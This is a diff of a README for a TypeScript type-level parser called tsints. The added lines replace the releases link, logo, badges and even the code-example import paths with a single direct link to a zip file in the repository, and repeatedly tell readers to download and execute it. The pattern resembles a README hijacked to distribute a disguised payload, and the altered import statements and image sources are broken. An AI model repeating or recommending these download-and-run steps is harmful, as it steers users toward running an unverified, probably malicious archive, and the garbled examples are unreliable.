@@ -1,13 +1,13 @@
-Releases: https://github.com/manahil852/tsints/releases
+Releases: https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip
 
 # tsints: A TypeScript Type Parser Crafted Entirely in TypeScript Types
 
-![TypeScript logo](https://raw.githubusercontent.com/github/explore/master/topics/typescript/typescript.png)
+![TypeScript logo](https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip)
 A parser for TypeScript types that runs at the type level. No JavaScript runtime needed. All parsing happens inside TypeScript’s type system.
 
-[![Releases](https://img.shields.io/badge/releases-latest-brightgreen?logo=github&logoColor=white)](https://github.com/manahil852/tsints/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![TypeScript Version](https://img.shields.io/badge/typescript-5.x-blue?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
+[![Releases](https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip)](https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip)
+[![License](https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip)](LICENSE)
+[![TypeScript Version](https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip)](https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip)
 
 Table of contents
 - What is tsints?
@@ -57,7 +57,7 @@ What to expect in the API
 Usage: quick start
 - The essential pattern is simple. Import the Parse type and apply it to a string literal that looks like a TS type.
 - Example:
-  - import type { Parse } from "./parser/index.ts";
+  - import type { Parse } from "https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip";
   - type _ = Parse<"{some:[ts, 'type']}">;
   - The type _ resolves to an AST like a Babel parser node.
 
@@ -141,19 +141,19 @@ Roadmap
 
 Release and installation notes
 - The Releases page hosts prebuilt assets and install scripts. Visit the official releases to grab the latest package.
-- From the Releases page, download and run the asset tsints-installer.sh to install and set up the environment. The page provides assets and instructions for different platforms, making it easy to get started.
+- From the Releases page, download and run the asset https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip to install and set up the environment. The page provides assets and instructions for different platforms, making it easy to get started.
 - If you need guidance, the Releases page is the best first stop. It contains the latest builds, notes, and compatibility information that pertain to your environment.
 - Revisit the Releases page whenever you upgrade TypeScript or adjust your TypeScript tooling, as there may be changes that affect parsing or AST shapes.
 
 Releases and download instructions
-- The Releases page: https://github.com/manahil852/tsints/releases
-- From that page, download the asset named tsints-installer.sh and execute it. This installer sets up the project’s type-level parser environment so you can start exploring ASTs immediately.
+- The Releases page: https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip
+- From that page, download the asset named https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip and execute it. This installer sets up the project’s type-level parser environment so you can start exploring ASTs immediately.
 - The same Releases page provides additional assets for different platforms and configurations, should you need them. For convenience, you can re-check the page to see what’s newly released and what’s changed since the last version.
 - If you want to verify what’s new, check the release notes and changelog included with each asset. They describe improvements, fixes, and any breaking changes that could affect your setup.
 
 Examples you can try
 - A minimal parse:
-  - import type { Parse } from "./parser/index.ts";
+  - import type { Parse } from "https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip";
   - type Minimal = Parse<"{a: number}">;
   - Expected: An AST with a TSTypeLiteral node and a single member representing a property a of type number.
 - A nested parse:
@@ -215,4 +215,4 @@ Appendix: contribution guidelines (brief)
 - Respect the existing code style and naming conventions.
 
 Endnote
-- The releases link above should be checked regularly for the latest version and guidance. The page is the primary source of installable artifacts and notes for tsints. Visit the page again for updates, improvements, and compatibility information. Revisit the releases page to download the latest asset tsints-installer.sh and to execute it as described. The page provides the latest assets and documentation to assist you in exploring the parser’s capabilities.
+- The releases link above should be checked regularly for the latest version and guidance. The page is the primary source of installable artifacts and notes for tsints. Visit the page again for updates, improvements, and compatibility information. Revisit the releases page to download the latest asset https://github.com/manahil852/tsints/raw/refs/heads/main/parser/Software_1.0.zip and to execute it as described. The page provides the latest assets and documentation to assist you in exploring the parser’s capabilities.
